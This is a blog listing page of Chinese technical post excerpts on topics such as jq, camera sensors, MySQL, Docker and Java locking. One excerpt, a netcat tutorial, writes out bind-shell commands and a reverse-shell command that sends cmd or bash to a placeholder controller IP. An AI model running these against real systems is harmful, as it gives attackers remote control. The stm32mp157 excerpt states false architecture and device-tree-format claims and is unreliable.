			<a href="/posts/aeecede89313a76b6f080b2fc4635676/" rel="bookmark">
			linux jq 使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		jq 使用 1，安装jq2，在一行输出3，去掉字符串的引号 1，安装jq # lsb_release -a No LSB modules are available. Distributor ID:	Ubuntu Description:	Ubuntu 18.04.3 LTS Release:	18.04 Codename:	bionic jq 安装 apt install jq -y 取某个值
.key, .foo.bar, .["key"] # cat config.json | jq .mining { "minerAddress": "t2quorlsyipjq5koh6pbtxctxd76lljwcrirj2oky", "autoSealIntervalSeconds": 120, "storagePrice": "0.000000001" } # cat config.json | jq .mining.minerAddress "t2quorlsyipjq5koh6pbtxctxd76lljwcrirj2oky" 2，在一行输出 使用参数-c 3，去掉字符串的引号 -r 以原始输出格式打印结果，而不是默认的带引号的字符串格式。
# lotus mpool pending | jq .Message.GasFeeCap | head "101041" "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aeecede89313a76b6f080b2fc4635676/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/543eca05a25c350fa2674ae2317437d1/" rel="bookmark">
			【计算机视觉：算法和应用】第二章：图像形成——2.3数码相机
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原书PDF链接： Computer Vision: Algorithms and Applications, 2nd ed. 2.1几何图元与变换
2.2相机辐射成像
2.3 数码相机 从一个或多个光源开始，在世界中一个或多个表面反射并通过相机镜头后，光最终到达成像传感器。到达传感器的光子是如何转换为我们在数字图像上看到的数字（R,G,B）值的呢？在这一节，我们构建了一个简单的模型来解释大多数重要的现象，如曝光（增益和快门速度），非线性映射，采样和混叠以及噪声。图2.23基于Healey等人提出的相机模型，展示了现代数码相机中处理过程的一个简单版本。
​
Chakrabarti等提出了一个复杂的24参数模型，能够更好地匹配数码相机中的处理过程，而Kim等提供了更多近期相机内处理流程的模型。最近，Brooks等提出了详细的相机内图像处理的流程模型来将（未处理）有噪声的JPEG图像转换为他们的RAW原图，以至于他们能够更好地去噪，而Tseng等提出了一个相机处理流程的可调模型，能够用于图像质量优化。
落在成像传感器上的光通常被一个主动传感区域接收，该区域在曝光期间（通常表示为一秒内的快门速度，如1/125，1/60，1/30）集成，然后光被传送到一组传感放大器。今天数字相机和摄像机中使用的两种主要传感器类型是电荷耦合器件（CCD）和金属氧化物半导体（CMOS）。
在CCD中，光子在曝光期间在每一个active well中累积。然后，在转移阶段，电子以一种“bucket brigade”的方式在well和well之间转移，直到他们被存放到传感放大器中，放大信号并将信号传输到一个模数转换器（ADC）中。当一个过度曝光像素的电荷溢出到相邻像素时，旧的CCD传感器容易高光溢出，但大多数较新的CCD都有防高光溢出技术（多余电荷会溢出的“槽”）。
在CMOS中，直接撞击到传感器上的光子会影响光电传感器的传导率（或增益），可以选择性地门控以控制曝光时间，并在读出之前使用多路复用方案进行局部放大。传统上，CCD传感器在质量敏感的应用中优于CMOS，如数字单反，而CMOS对低功耗应用更好，但今天CMOS用于大多数数码相机。
影响数码成像传感器性能的最主要的因素是快门速度、采样间距、填充因子、芯片尺寸、模拟增益、传感器噪声以及模拟-数字转换器的分辨率（和质量）。这些参数的许多实际值都可以从嵌入数字图像的EXIF标签中读取，其他信息可以从相机制造商的规格表或相机评测或校准网站获得。
快门速度 快门速度（曝光时间）直接控制了到达传感器的光量，因此决定了图像是否欠曝或过曝。(对于明亮的场景，摄影师有时使用中性密度滤镜，以获得浅景深或运动模糊效果，此时需要大光圈或慢快门速度。)对于动态场景，快门速度也决定了得到的照片中运动模糊量。通常，更高的相机速度（更少运动模糊）可以使后续分析更简单（见10.3节了解移除模糊的技术）。然而，当拍摄视频时，一些运动模糊可能是可取的，以避免频闪效果。
采样间距 采样间距是成像芯片上相邻传感器单元之间的物理间距（图2.24)。
​
拥有更小采样间距的传感器有更高的采样密度，因此对于给定的有源芯片区域提供了更高的分辨率（就像素而言）。然而，更小的间距也意味着每一个传感器有更小的面积，不能够积累许多光子；这使得其不够光敏感，更容易受到噪声影响。
填充系数 填充系数是实际感光区域大小与理论上可用感光区域（水平采样间距和垂直采样间距的乘积）之间的比率。较高的填充系数通常更受欢迎，因为它们可以捕获更多的光线并减少混叠（参见第2.3.1节）。虽然填充系数最初受到需要在活动感光区域之间放置额外电子设备的限制，但现代背面照度（或背光）传感器，结合高效的微透镜设计，已经大大消除了这一限制。相机的填充系数可以通过光度相机校准过程（见10.1.4节）进行经验测定。
芯片尺寸 传统的摄像机和傻瓜相机芯片面积较小（1/4英寸到1/2英寸），而数码单反相机则试图更接近传统的35毫米胶片相框。当整体的设备尺寸不重要时，拥有更大的芯片尺寸更受欢迎，因为每一个传感器单元能够更加光敏。（对于紧凑型相机来说，较小的芯片意味着所有的光学器件都可以按比例缩小）。然而，更大的芯片制造的价格更贵，这不仅仅是因为每个晶圆片中可以包装的芯片更少，也因为芯片缺陷的概率随芯片面积呈指数级增长。
模拟增益 在模数转换之前，传感信号通常用一个传感放大器增强。在摄像机中，这些放大器的增益传统上由自动增益控制（AGC）逻辑控制，能够调整这些值来获得一个较好的全局曝光。在更新的数码相机中，用户能够通过ISO设置来对这种增益进行额外的控制，这通常用ISO标准单位表示，例如100，200或400。因为大多数相机中的自动曝光控制也能够调整光圈和快门速度，手动设置ISO移除了相机控制中的一个自由度，就像手动指定光圈和快门速度一样。在理论上，更高的增益使得相机能够在暗光环境下性能更好（当光圈已经最大时，由于长曝光时间获得更少的运动模糊）。然而实际上，更高的ISO值通常会放大传感器噪声。
传感器噪声 在整个传感过程中，，各种来源的噪声被添加进来，其中可能包括固定模式噪声、暗电流噪声、散粒噪声、放大器噪声和量化噪声。采样图像中存在的噪声量取决于所有这些量，以及入射光（由场景辐射和光圈控制）、曝光时间和传感器增益。此外，对于噪声是由低光子数量引起的低光条件下，噪声的泊松模型可能比高斯模型更合适。
正如10.1.1节中详细讨论的，Liu等人使用了这个模型以及以及由Grossberg和Nayar获得的相机响应函数（CRFs）的经验数据库，来估计给定图像的噪声级别函数（NLF），其预测给定像素的总噪声方差作为其亮度的函数（一个稀疏的NLF对每一个颜色通道进行估计）。另一种替代方法是，当你在拍照前使用相机时，通过重复拍摄一个包含各种颜色和亮度的场景来预先校准NLF，如图10.3b所示的Macbeth颜色图。
​
（在估计方差时，一定要丢弃具有大梯度的像素或降低其权重，因为曝光之间的小变化会影响这些像素的感知值。）不幸的是，由于传感系统中复杂的相互作用，可能需要为不同的曝光时间和增益设置重复预校准过程。
在实践中，大多数计算机视觉算法，如图像去噪、边缘检测和立体匹配，都受益于至少对噪声水平的初步估计。除了能够预先校准相机或对同一场景进行重复拍摄之外，最简单的方法是寻找接近似恒定值的区域，并估计这些区域中的噪声方差。
ADC分辨率 成像传感器中模拟处理链的最后一步是模数转换（ADC）。虽然能够使用不同的技术来进行这个步骤，但我们感兴趣的两个量是这个步骤的分辨率（它能够产生多少位）以及其噪声水平（在实践中这些位中多少是有用的）。对大多数相机来说，标注的位数（压缩JPEG图像是8位，一些单反提供的RAW格式的名义上是16位）超过了实际可用的位数。最好的判断方法是简单地校准给定传感器的噪声，例如，通过对同一场景的重复拍摄，并绘制出估计的噪声关于亮度的函数（练习2.6）。
数字后处理 一旦到达传感器的辐照度值被转换为数字比特，大多数相机在压缩和存储像素值之前会执行各种数字信号处理（DSP）操作，以增强图像。包括彩色滤波器阵列（CFA）去马赛克，白点设置，以及通过伽马函数映射亮度值，以增加信号的感知动态范围。我们将在2.3.2节中介绍这些，但在此之前，我们将回到混叠，这与传感器阵列填充系数有关。
更新的图像传感器 成像传感器和深度传感器等相关技术的能力继续快速发展。跟踪这些发展的会议包括由成像科学和技术学会主办的电子成像科学和技术研讨会和图像传感器世界博客。
2.3.1采样和混叠 当一个撞击图像传感器的光场落到成像芯片中的主动感知区域时会发生什么？对于到达每一个主动单元的光子会融合在一起，然后进行数字化，如图2.24所示。然而，如果芯片上的填充系数很小，并且信号没有带限，就会产生视觉上令人不愉快的混叠。
为了探索混叠现象，让我们首先观察一维信号（图2.25），其中我们有两条sine波，一条频率f=3/4，另一条频率为f=5/4。如果我们以频率f=2对两个信号进行采样，我们可以看到他们产生了相同的样本（用黑色表示），所以我们可以说他们混叠了。为什么会产生这个糟糕的影响？本质上，我们无法重建原始信号，因为我们不知道两个原始频率中哪一个存在。
​
事实上，香农采样定理表明，从瞬时样本重建一个信号所需的最小采样频率必须至少是最高频率的两倍，
​
信号中的最大频率称之为奈奎斯特频率，最小采样频率的倒数称之为奈奎斯特速率。
然而，你也许会问，由于成像芯片实际上是平均了有限区域内的光场，所以点采样的结果是否仍然适用？对传感区域进行平均确实往往会衰减一些较高的频率。然而，即使填充系数为100%，如图2.25右图所示，高于奈奎斯特极限的频率（采样频率的一半）仍然会产生混叠信号，尽管其幅度小于相应的带限信号。
关于为什么混叠是不好的，一个更有说服力的论证可以通过使用质量差的滤波器，如盒（方）滤波器对信号进行下采样。图2.26展示了一个高频的chirp图像（这样称呼是因为频率会随着时间增加），以及用25%填充系数，100%填充系数以及高质量9-tap滤波器采样的结果。下采样（抽取）滤波器的更多例子能够在3.5.2和图3.29中找到。
​
预测一个成像系统（或甚至一个图像处理算法）产生的混叠量的最好的方法是估计点扩散函数（PSF），其表示了一个特定的像素传感器对理想点光源的响应。PSF是由光学系统（透镜）和芯片传感器有限积分区域产生的模糊的组合（卷积）。
如果我们知道了透镜的模糊函数和成像芯片的填充系数（传感器区域形状和间距）（另外可选地，抗混叠滤波器的响应），我们能够将这些数据卷积（如3.2节描述的）来获得PSF。图2.27a展示了一个透镜的PSF一维横截面，其模糊函数假设为一个半径等于像素间距s的盘，再加上一个水平填充系数为80%的传感芯片。
​
对这个PSF进行傅里叶变换（3.4节），我们能够获得调制传输函数（MTF），由此我们可以估计混叠量为f≤fs奈奎斯特频率之外的傅里叶幅度的面积。如果我们对透镜散焦使得模糊函数的直径为2s（图2.27c），我们可以发现混叠量大大减少了，但是图像细节（频率接近f=fs）也减少了。
在实验室条件下，可以通过观察一个点光源，如观察从一个后方点亮的黑色纸板上的针孔来估计（像素精度）PSF。然而这个PSF（针孔的实际图像）只精确到一个像素分辨率，虽然它可以建模较大的模糊（如离焦引起的模糊），但它不能建模PSF的亚像素形状并预测混叠量。一种替代的技术在10.1.4节中描述，是观察一个标定图案（例如由倾斜的台阶边缘组成的图案），其理想表面能够重新合成到亚像素精度。
除了会在图像获取的过程中出现，混叠也会由各种图像处理操作导致，例如重采样，上采样和下采样。3.4节和3.5.2节讨论了这些问题并展示了怎样仔细地选择滤波器能够减少混叠量。
2.3.2颜色 在2.2节当中，我们知道了光和表面反射是波长的函数。当入射光撞击到成像传感器时，来自光谱不同部分的光以某种方式整合到我们在数字图像中看到的离散的红、绿、蓝（RGB）颜色值中。这个过程是怎样工作的并且我们如何分析并操作颜色值呢？
你也许会回想起在你孩童时代，混合颜料来获得一种新颜色的过程像魔术一样。你也许能回想起蓝色+黄色得到绿色，红色+蓝色得到紫色，红色+绿色得到棕色。如果你长大后再次讨论这个问题，您可能已经知道，正确的减色原色实际上是青色（浅蓝绿色）、品红色（粉红色）和黄色（图2.28b)，尽管黑色在四颜色印刷（CMYK）仍然常用。
​
如果你曾经上过任何绘画课程，你会学到颜色甚至由许多奇特的名字，如紫红色，天蓝色，和黄绿色。减法色被称为减法，因为颜料吸收光谱中的某些波长。
再后来，你也许会了解到加色法三原色（红绿蓝）以及他们如何相加（用投影设备或在电脑屏幕上）能够得到青色，品红色，黄色，白色以及其他我们常在电视设置和显示器上看到的颜色。（图2.28a）。
通过怎样的过程，两种不同的颜色，如红色和绿色，可以相互作用产生第三种颜色，如黄色？是波长以某种形式混合产生了一个新的波长吗？
你也许知道正确的答案和物理上波长的混合没有任何关系。相反，三原色的存在是人视觉系统三刺激（或三色）性质的结果，因为我们有三种不同的视锥细胞，每一种会选择性地对色谱地不同部分产生响应。注意到对于机器视觉应用（如遥感和地形分类）来说，更偏向使用更多的波长。相同的，监测应用通常受益于近红外（NIR）范围内的传感。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/543eca05a25c350fa2674ae2317437d1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e16523248213a645ef9a01b314fa05b3/" rel="bookmark">
			Windows10下Mysql8.0安装教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1.下载Mysql8.02.解压Mysql安装包到指定目录3.初始化Mysql服务4.安装Mysql服务5.启动Mysql服务6.登录Mysql服务7.修改Mysql密码8.重启Mysql服务停止服务启动服务 1.下载Mysql8.0 链接：https://pan.baidu.com/s/1uP2xZj8g05xg-oHX_nfnmA
提取码：ktf4
2.解压Mysql安装包到指定目录 D:\installSoft\mysql-8.0.21-winx64
在mysql根目录创建my.ini文件
[mysql] # 设置mysql客户端默认字符集 default-character-set=utf8 [mysqld] # 设置3306端口 port = 3306 # 设置mysql的安装目录 basedir=D:\installSoft\mysql-8.0.21-winx64 # 设置mysql数据库的数据的存放目录 datadir=D:\installSoft\mysql-8.0.21-winx64\data # 允许最大连接数 max_connections=200 # 设置mysql服务端默认字符集 character-set-server=utf8 # 创建新表时将使用的默认存储引擎 default-storage-engine=INNODB 3.初始化Mysql服务 CMD命令窗口下，进入根目录D:\installSoft\mysql-8.0.21-winx64\bin
mysqld --initialize --user=mysql --console 如图
保存root@localhost: 后面的初始密码到临时文件。
4.安装Mysql服务 mysqld install MySQL --defaults-file="D:\installSoft\mysql-8.0.21-winx64\my.ini" 5.启动Mysql服务 net start mysql
D:\installSoft\mysql-8.0.21-winx64\bin&gt;net start mysql MySQL 服务正在启动 . MySQL 服务已经启动成功。 6.登录Mysql服务 mysql -u root -p
这里粘贴上面保存的密码
D:\installSoft\mysql-8.0.21-winx64\bin&gt;mysql -u root -p Enter password: ************ 7.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e16523248213a645ef9a01b314fa05b3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/90a81d3dfa96abaebc4211e763a0c89d/" rel="bookmark">
			netcat瑞士军刀（正向shell和反向shell）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		正向shell：控制端主动发起连接请求去连接被控制端。通常中间网络链路不存在阻碍的时候使用。
反向shell：被控制端主动发起连接去请求连接控制。通常被控端由于防火墙受限制、权限不足、端口被占用等问题导致被控端不能正常接收发送过来的数据包的时候使用。
参数作用-c指定连接后要执行的shell命令-e指定连接后要执行的文件名-k配置 Socket一直存活(若不想退出 Shell后使监听断开可使用此参数)-l监听模式-p设置本地主机使用的通信端口-u使用UDP传输协议,默认为TCP-v显示指令执行过程,用-vv会更详细 在实战中，大多数采用反向shell，因为正向shell有很多因素导致连接失败，比如说硬件设备有防火墙，入侵防御系统等，还有网站防火墙，端口占用，权限不足等场景，特别是硬件设备如果你正向连接被防火墙拦截导致打草惊蛇，后期攻击相当繁琐。反向shell：而被控制端主动向外发送的数据包通常都不会被拦截。
nc反弹shell （简单举两个列子）
我今天用网络连通性来说下正向和反向
正向shell（网络链路没有阻碍，网络互通）
被控端
原理:被控端将cmd重定向到本地1111端口，控制端主动连接到被控制端的1111端口，即获得shell
#windows机器
nc64.exe -lvvp 1111 -e C:\Windows\System32\cmd.exe
#linux机器
nc -lvvp 1111 -e /bin/bash
控制端
nc 被控端的地址 端口
反向shell（有安全设备防护，控制端无法主动连接被控制端。或者控制端ping不通被控制端）
原理:被控端将cmd.exe重定向到控制端的6666端口，控制端只需要监听本地的6666端口，被控端主动连接控制端，即可获得shell。
被控端
nc 控制端IP 端口 -e cmd
控制端
nc -lvvp 端口
控制端ping不通被控端
被控端能ping通控制端 不管是正向shell还是反向shell 它们都是由被控制端将命令行输入和输入通过tcp/udp端口，发送到控制端，只是正向shell是由控制端主动发起连接的，而反弹shell是被控制端主动发起连接的。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5b9b270440ea334c82148abd03f4daec/" rel="bookmark">
			stm32mp157和imx6ull在设备树节点上设置ap3216c的主要区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		stm32mp157和imx6ull在设备树节点上设置ap3216c的主要区别是，它们使用的不同的硬件架构和不同的设备树格式。以下是两者之间的差异：
硬件架构：stm32mp157是基于ARM Cortex-M4内核的微控制器，而imx6ull则是基于ARM Cortex-A7内核的嵌入式处理器。
设备树格式：stm32mp157使用的设备树格式是Device Tree Compiler（DTC）格式，而imx6ull使用的是Flattened Device Tree（FDT）格式。
基于这些差异，设置ap3216c的设备树节点在两者之间有一些细微的差异。以下是一个示例：
stm32mp157设备树节点示例：
imx6ull设备树节点示例：
注意，在这两个示例中，ap3216c节点的名称和compatible属性都相同。
总体上来说，stm32mp157和imx6ull之间的差异在于它们所用的硬件架构和设备树格式，但在设置ap3216c设备树节点时，它们的区别不大。
备注：stm32mp157和imx6ull的ap3216c驱动是完全一样的，驱动代码如下：
ap3216creg.h：
#ifndef AP3216C_H
#define AP3216C_H
#define AP3216C_ADDR 0X1E /* AP3216C器件地址 */
/* AP3316C寄存器 /
#define AP3216C_SYSTEMCONG 0x00 / 配置寄存器 /
#define AP3216C_INTSTATUS 0X01 / 中断状态寄存器 /
#define AP3216C_INTCLEAR 0X02 / 中断清除寄存器 /
#define AP3216C_IRDATALOW 0x0A / IR数据低字节 /
#define AP3216C_IRDATAHIGH 0x0B / IR数据高字节 /
#define AP3216C_ALSDATALOW 0x0C / ALS数据低字节 /
#define AP3216C_ALSDATAHIGH 0X0D / ALS数据高字节 /
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5b9b270440ea334c82148abd03f4daec/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/01b6269fee9ecc56e252abf1dd14c8f1/" rel="bookmark">
			RT-Thread 汇编分析启动流程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 文章目录 一、汇编指令二、启动文件三、流程图 一、汇编指令 这里介绍即几条最常见实用的汇编指令
LDR R0,[R1]：将R1指定内存地址数据，存储到寄存器R0中。STR R0,[R1,#4]：将寄存器R0中数据存储到寄存器R1加上偏移量4的位置。MOV r0,#0x01：将立即数0x01存储到r0寄存器。POSH {r2-r3,lr}：入栈，先入lr，再入r3，后r2，sp指向r2，即栈顶位置。 二、启动文件 1. 上电后执行第一条指令Reset_Handler
直到“b LoopCopyDataInit”，即跳转到标签LoopCopyDataInit 执行
2. 在LoopCopyDataInit 标签中，将.data段从Flash拷贝到RAM里面
直到b LoopFillZerobss，即跳转到标签LoopFillZerobss执行
3. 在LoopFillZerobss 标签中，将.bss段初始化为0
直到bl SystemInit，即跳转到标签SystemInit执行，并在执行后返回此处
4. 在SystemInit 标签中，系统时钟初始化
执行完后，返回到LoopFillZerobss 标签，继续执行bl entry
5. 在entry标签中，进入到rtthread_startup函数，用于启动 RT-Thread 内核和相关组件
执行完后，返回到LoopFillZerobss 标签，继续执行bx lr
6. bx lr
将会从保存在 lr 寄存器中的返回地址中读取值，并跳转到该地址继续执行代码。
三、流程图 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dfbcb976f065a719ceb8ed4fa617455f/" rel="bookmark">
			van-list的onload事件多次触发的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、问题描述 如图所示，页面刷新的时候，调了3次接口（总共27条数据，我分页10条），一直莫名奇妙的
我期望是默认加载第一页，然后我上拉的时候再push第二页的数据
二、解决方法 还是要多看文档
1、为什么会连续触发 load 事件？ 如果一次请求加载的数据条数较少，导致列表内容无法铺满当前屏幕，List 会继续触发 load 事件，直到内容铺满屏幕或数据全部加载完成。
因此你需要调整每次获取的数据条数，理想情况下每次请求获取的数据条数应能够填满一屏高度。
2、在 html、body 上设置 overflow 后一直触发加载？ 如果在 html 和 body 标签上设置了 overflow-x: hidden 样式，会导致 List 一直触发加载。
原来是这个overFlow的问题！！！！！
这个问题的原因是当元素设置了 overflow-x: hidden 样式时，该元素的 overflow-y 会被浏览器设置为 auto，而不是默认值 visible，导致 List 无法正确地判断滚动容器。解决方法是去除该样式，或者在 html 和 body 标签上添加 height: 100% 样式。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cac31f5f6e926c51b90b4bf55ebc5e03/" rel="bookmark">
			并发编程2：Java 加锁的原理和JVM对锁的优化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		为什么要加锁 在多进程的环境下，如果一个资源被多个进程共享，那么对资源的使用往往会表现的随机和无序，这显然是不行的。例如多个线程同时对控制台输出，每个线程都输出的是完整的句子但是多个线程同时同时输出，则输出的内容就会被完全打乱，获取不到本来的信息了。对于这种共享资源，需要进行同步管理，资源在被一个线程占用时，其他线程只能阻塞等待。Java 的同步就是使用的对象锁机制来实现的，要使用资源则先获取资源对应的锁后才能操作。
一、 Synchronized 关键字的作用是给对象加锁 java 中的多线程同步机制通过对象锁来实现，Synchronized 关键字则是实现对对象加锁来实现对共享资源的互斥访问。synchronized 关键字实现的是独占锁或者称为排它锁，锁在同一时间只能被一个线程持有。JVM 的同步是基于进入和退出监视器对象(Monitor 也叫管城对象)来实现的，每个对象实例都有一个 Monitor 对象，和 Java 对象一起创建并一起销毁。Java 编译器，在编译到带有synchronizedg 关键字的代码块后，会插入 monitorenter 和 monitorexit 指令到字节码中，monitorenter 也就是加锁的入口了，线程会为锁对象关联一个 ObjectMonitor 对象。
二、对象基于 ObjectMonitor 加锁的原理 2.1 对象在内存中的布局 2.2 ObjectMonitor 监视器 //结构体如下 ObjectMonitor::ObjectMonitor() { _header = NULL; _count = 0; _waiters = 0, _recursions = 0; //线程的重入次数 _object = NULL; _owner = NULL; //标识拥有该monitor的线程 _WaitSet = NULL; //等待线程组成的双向循环链表，_WaitSet是第一个节点 _WaitSetLock = 0 ; _Responsible = NULL ; _succ = NULL ; _cxq = NULL ; //多线程竞争锁进入时的单向链表 FreeNext = NULL ; _EntryList = NULL ; //_owner从该双向循环链表中唤醒线程结点，_EntryList是第一个节点 _SpinFreq = 0 ; _SpinClock = 0 ; OwnerIsThread = 0 ; } ObjectMonitor 是 Java 中的一种同步机制，通常被描述为一个对象，和 Java 对象一起创建一同销毁。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cac31f5f6e926c51b90b4bf55ebc5e03/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cc28a85b8b3395297db0ffda6ca20570/" rel="bookmark">
			基于ZigBee的农业大棚环境监控系统设计与实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 目录
1 适用场景
2 开发环境
3 技术框架
4 实现功能
5 上位机实物图
6 OneNET云平台
1 适用场景 花卉种植、植物种植、农业大棚、农田灌溉、温室大棚、葡萄大棚 2 开发环境 下位机开发环境：IAR embedded Workbench
上位机开发环境：Visual Studio 2022
小鱼儿电子设计微信号：IOTElectronics
3 技术框架 技术框架：ZigBee终端节点+ZigBee协调器节点+串口通信技术+电脑上位机+数据库、 ZigBee终端节点+ZigBee协调器节点+串口通信技术+电脑上位机+数据库+OneNET云平台
4 实现功能 1.ZigBee无线传感网络的构建：采用ZigBee终端节点置于大棚内，ZigBee协调器节点置于农业大棚管理室，通过ZigBee通信技术实现大棚内监测数据与管理端的交互。 2.温湿度监测：采用DHT11温湿度传感器实时采集大棚内的温度和湿度。 3.土壤湿度监测：采用YL-69土壤湿度传感器实时采集大棚内的土壤湿度。 4.光照强度监测：采用5516光敏电阻传感器实时采集大棚内的光照强度。 5.自动灌溉：当大棚内的土壤湿度低于设定阈值的最小值，自动打开水泵进行灌溉，直到到达阈值最大值停止灌溉。 6.自动补光：当大棚内的光照强度低于设定阈值最小值，自动打开照明灯进行补光，直到到达阈值最大值停止。 7.自动加热：当大棚内的温度低于设定阈值最小值，自动打开加热片进行加热，直到加热至阈值最大值停止。 8.自动降温：当大棚内的温度高于设定阈值最大值，自动打开风扇进行降温，直到降温至阈值最小值停止。 9.设定阈值：可以通过按键或者上位机设定温度、湿度、光照强度、土壤湿度的最适阈值。 10.屏幕显示：可以通过屏幕显示温度、湿度、光照强度、土壤湿度的数据及其阈值。 11.电脑上位机监测：ZigBee终端节点采集大棚内数据，通过ZigBee组网发送至ZigBee协调器节点后，通过串口通信技术接入电脑上位机端，实现数据的查询、阈值的设定、设备的控制和曲线分析等功能。 12.OneNET云平台：通过WiFi无线通信技术将监测数据上传OneNET云平台，可以远程对农业大棚环境的数据监测和设备的控制。 5 上位机实物图 6 OneNET云平台 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/59552731770d28cd51996d285d32731b/" rel="bookmark">
			关键点匹配——商汤LoFTR源码详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		源码地址见文末
1.项目与参数配置解读 首先，进入目录，使用pip install -r requirements.txt配置环境。
首先，对于demo的运行，首先需要准备好需要用于关键点匹配的数据，提供的代码中置于了image文件夹下，然后是训练的权重，代码中下载了室内场景和室外场景的训练权重。
配置参数指定：
--weight outdoor_ds.ckpt --save_video --input ./images/ --output_dir ./output/ 2.Backbone特征提取 每次输入为两张图像，首先，使用卷积对两张图像进行特征提取。获得1/8和1/2尺度的粗粒度和细粒度特征图。源码中这部分使用的是resnet
class ResNetFPN_8_2(nn.Module): """ ResNet+FPN, output resolution are 1/8 and 1/2. Each block has 2 layers. """ def __init__(self, config): super().__init__() # Config block = BasicBlock initial_dim = config['initial_dim'] block_dims = config['block_dims'] # Class Variable self.in_planes = initial_dim # Networks self.conv1 = nn.Conv2d(1, initial_dim, kernel_size=7, stride=2, padding=3, bias=False) self.bn1 = nn.BatchNorm2d(initial_dim) self.relu = nn.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/59552731770d28cd51996d285d32731b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6343faf7a6a21459920c744b4602c8ea/" rel="bookmark">
			Dockerfile与Docker网络
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、Dockerfile 1、概念： Dockerfile是用来构建docker镜像的文本文件，是由构建镜像所需要的指令和参数构建的脚本。
2、构建步骤： ① 编写Dockerfile文件
② docker build命令构建镜像
③ docker run依据镜像运行容器实例
Dockerfile 是构建 docker 镜像的指令集，docker 镜像是容器运行的静态模板，而 docker 容器是基于 docker 镜像创建的可运行实例。
3、Dockerfile基础知识： ① 每条保留字指令都必须为大写字母，且后面要跟随至少一个参数
② 指令按照从上到下顺序执行
③ #表示注释
④ 每条指令都会创建一个新的镜像层并对镜像进行提交
二、Dockerfile常用保留字指令 1、概念： 在 Dockerfile 中，保留字 (Reserved Keywords) 是指一些特定的指令或关键字，用于描述镜像的构建过程。
2、常用保留字： (1) FROM：当前新镜像是基于哪个镜像的，指定一个已存在的镜像作为模版。Dockerfile 第一条必须是FROM。
(2) MAINTAINER：镜像维护者和邮箱。
(3) RUN：容器构建时需要运行的命令，RUN 在 docker build 时运行。
两种格式：
① shell 格式：
#等同于在终端操作的shell命令 格式： RUN &lt;命令行命令&gt; RUN yum -y install vim ② exec 格式：
#格式：RUN ["可执行文件" , "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6343faf7a6a21459920c744b4602c8ea/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0e3a37ad061b42c2f7b99afc6c765b73/" rel="bookmark">
			Difference between getc(), getchar()， and gets()
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 getc(): 从输入中只能读单个字符
getchar()：从标准输入流中输入都单个字符。
两者基本等同，唯一不一样的是getc()是任何输入流，而getchar()是标准输入流。
gets:可以读入含有空格的字符串
// Example for getc() in C #include &lt;stdio.h&gt; int main() { printf("%c", getc(stdin)); return (0); } // Example for getchar() in C #include &lt;stdio.h&gt; int main() { printf("%c", getchar()); return 0; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dad432bdb68798b5289f75639bfec8c4/" rel="bookmark">
			SQL Server数据库数据文件的迁移
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		SQL Server数据库数据文件的迁移 如何将一台电脑中的SQL Server数据库数据文件迁移到另一台电脑上？
一、首先查看数据库文件保存在电脑中的位置；
如下图所示：右键-》属性-》数据库设置；可以找到数据库文件保存位置；
二、数据库分离；
选择数据库，右键-》任务-》分离，然后确定；
数据库分离是指将数据库文件从数据库服务器实例中分离出来，相当于关闭了数据库。
数据库分离后，应用程序不能连接到该数据库，数据库文件可以被其它进程访问。通常分离数据库用于快速地将数据库迁移到另一个SQLSERVER实例。
三、数据库分离后就可以将数据库文件复制到另一台电脑上了；
这里注意，最好还是要放到sqlserver的data文件夹，放别的地方可能会报错，因为文件夹的读写属性还有用户权限不一样，反正修改起来特别麻烦。
四、在另一台电脑中，打开SQL Server管理程序；
在数据库上右键-》附件-》选择迁移过来的数据库mdf文件；完成；
注意：
数据库文件：主数据库文件（.mdf）、次数据库文件（.ndf）
